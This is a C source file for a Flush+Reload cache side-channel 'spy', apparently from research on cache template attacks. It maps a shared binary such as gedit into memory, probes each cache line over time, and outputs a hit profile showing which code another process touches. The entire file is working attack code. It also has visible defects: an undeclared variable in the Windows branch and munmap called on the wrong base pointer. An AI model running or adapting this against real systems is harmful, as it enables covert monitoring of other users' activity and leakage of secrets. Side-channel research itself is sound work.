#include <unistd.h>
#define _GNU_SOURCE
#ifdef _WIN32
#include <windows.h>
#else
#include <fcntl.h>
#include <sys/mman.h>
#endif
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <sched.h>
#include <stdint.h>
#include "../../cacheutils.h"

// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (155)

size_t flushandreload(void* addr, size_t duration)
{
  size_t count = 0;
  size_t time = 0;
  size_t delta = 0;
  size_t end = rdtsc() + duration * 1000*1000;
  while(time < end)
  {
    time = rdtsc();
    maccess(addr);
    delta = rdtsc() - time;
    flush(addr);
    if (delta < MIN_CACHE_MISS_CYCLES)
    {
      count++;
    }
    for (int i = 0; i < 5; ++i)
      sched_yield();
  }
  return count;
}

int main(int argc, char** argv)
{
  if (argc != 8)
    exit(!fprintf(stderr,"  usage: ./spy <probeduration> <addressrange> <perms> <offset> <dev> <inode> <filename>\n"
                 "example: ./spy 200             400000-489000  --    0        -- -- /usr/bin/gedit\n"));
  size_t duration = 0;
  if (!sscanf(argv[1],"%lu",&duration))
    exit(!printf("duration error\n"));
  unsigned char* start = 0;
  unsigned char* end = 0;
  if (!sscanf(argv[2],"%p-%p",&start,&end))
    exit(!printf("address range error\n"));
  size_t range = end - start;
  size_t offset = 0;
  if (!sscanf(argv[4],"%lx",&offset))
    exit(!printf("offset error\n"));
  char filename[4096];
  if (!sscanf(argv[7],"%s",filename))
    exit(!fprintf(stderr,"filename error\n"));
  fprintf(stderr,"filename: %80s, offset: %8lx, duration: %luus, probes: %10lu\n",filename,offset,duration,range/64);
  if (duration == 0)
    exit(0);
#ifdef _WIN32
  unsigned char* addr = (unsigned char*)LoadLibrary(name);
#else
  int fd = open(filename,O_RDONLY);
  if (fd < 3)
    exit(!printf("error: failed to open file\n"));
  unsigned char* addr = (unsigned char*)mmap(0, 64*1024*1024, PROT_READ, MAP_SHARED, fd, 0);
#endif
  start = addr + offset;
  char j = 0;
  size_t count = 0;
  printf("file,addr,hits\n");
  size_t promille = 0;
 	for (size_t i = 0; i < range; i += 64)
  {
    printf("%s,%8p,",filename,(void*)offset + i);
    for (size_t k = 0; k < 5; ++k)
      sched_yield();
    flush(start + i);
    for (size_t k = 0; k < 5; ++k)
      sched_yield();
    count = flushandreload(start + i, duration);
    printf("%4ld\n",count);
    if (1000 * i / range > promille)
    {
      promille = 1000 * i / range;
      fprintf(stderr,"%ld/1000\n",promille);
    }
  }
  munmap(start,range);
  close(fd);
  return 0;
}

